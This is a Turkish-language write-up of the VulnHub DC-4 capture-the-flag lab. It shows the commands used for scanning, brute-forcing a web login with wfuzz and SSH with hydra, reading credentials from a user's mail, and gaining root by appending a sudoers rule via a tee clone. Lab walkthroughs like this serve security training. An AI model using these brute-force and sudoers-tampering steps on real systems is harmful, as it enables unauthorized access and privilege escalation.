---
title: "VULNHUB DC-4 Write Up"
date: 2020-10-03T13:30:54+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,hydra,tee,ssh,brute force] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-4,313/) 'da yer alan DC-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/dc4/cover.png
  
---

Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-4,313/) 'da yer alan DC-4 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar... :blush:

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/dc4/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.

```bash
sudo nmap -sV -sC -p- 192.168.56.113
```

{{< image src="/images/vulnhub/dc4/nmap.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

80 portunda çalışan web servisine tarayıcından istek atılır. 

{{< image src="/images/vulnhub/dc4/web.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Web dizin taraması yapılır.

```bash
gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/dirb/big.txt -x php,txt
```

```terminal
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.113
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/10/02 08:33:12 Starting gobuster
===============================================================
/command.php (Status: 302)
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/login.php (Status: 302)
/logout.php (Status: 302)
===============================================================
2020/10/02 08:33:26 Finished
===============================================================
```
Index.php sayfasının login.php sayfasına yönlendirilmiştir. Sqlmap ile login sayfasında Sql Injection açığı için kontrol edildiğinde herhangi bir zafiyet görülmektedir. Login sayfasına admin kullanıcısı için brute-force saldırısı yapılır. Admin kullanıcısı için happy parola bilgisi elde edilir.

```bash
wfuzz -c -z file,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt --hs incorrect -d "username=admin&password=FUZZ" http://192.168.56.113/login.php
```

{{< image src="/images/vulnhub/dc4/force.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Admin kullanıcısı ile giriş yapılır. 

{{< image src="/images/vulnhub/dc4/admin.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Command sayfasına giriş yapılır. 

{{< image src="/images/vulnhub/dc4/commandpage.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Burpsuite aracı ile giden istekler incelenir. İstek gönderilirken boşluk karakteri + ile kodlanmaktadır. wget aracı ile shell alıncak dosya yüklenir. Ancak dizine yazma yetkisi sadece root kullanıcısına ait olduğundan başarısız olunur. 

{{< image src="/images/vulnhub/dc4/bp1.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**ls** komutu ile dizinlerde gezinilerek keşif yapılır. jim kullanıcısının home dizini altında bir parola listesi bulunur.

{{< image src="/images/vulnhub/dc4/bp2.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**cat** komutu ile liste görüntülenir ve localhost'a ssh servisine yapılacak olan brute force saldırısı için kayıt edilir.

{{< image src="/images/vulnhub/dc4/bp3.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Tespit edilen kullanıcılardan wordlist oluşturularak ve hydra aracı ile ssh servisine brute force saldırısı yapılır.

{{< image src="/images/vulnhub/dc4/bp4.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

```bash
hydra -L user.lst -P pass.lst ssh://192.168.56.113
```
{{< image src="/images/vulnhub/dc4/hydra.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Elde edilen bilgiler ile ssh bağlantısı yapılır. ```Sudo -l``` komutu girildiğinde parola istenmektedir. Parola rastgele girildiğinde hatalı deneme kullanıcıya mail olarak gönderilmektedir. */var/mail/* dizini altında yer alan jim dosyası okunarak kullanıcı mail kutusu kontrol edilir. Charles kullanıcısından gelen bir mailde parola bilgisi yer almaktadır. Charles kullanıcısına geçiş yapılır.

{{< image src="/images/vulnhub/dc4/charlesmail.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 3. Yetki Yükseltme

Charles kullanıcısına ait sudo yetkileri kontrol edilir. 


{{< image src="/images/vulnhub/dc4/sudo.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**Teehee** adlı uygulamanın root yetkisi ile kullanılabileceği tespit edilir. Uygulamanın içeriğine bakılır. Uygulamanın tee uygulaması ile aynı olduğu görülür. 
```bash
strings /usr/bin/teehee
```
{{< image src="/images/vulnhub/dc4/tee.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

**tee** uygulaması kendisine gönderilen çıktıyı hem dosyaya hemde standart çıkış olan terminal ekranına basar. Sudoers dosyasına charles kullanıcısının tüm komutlarını çalıştırması için düzenlenme yapılır.

```bash
echo "charles ALL=(ALL) ALL" | sudo teehee -a /etc/sudoers
```
```Sudo su``` ile root kullanıcısına geçilerek */root* dizininde yer alan flag değeri okunur.

{{< image src="/images/vulnhub/dc4/rootflag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}





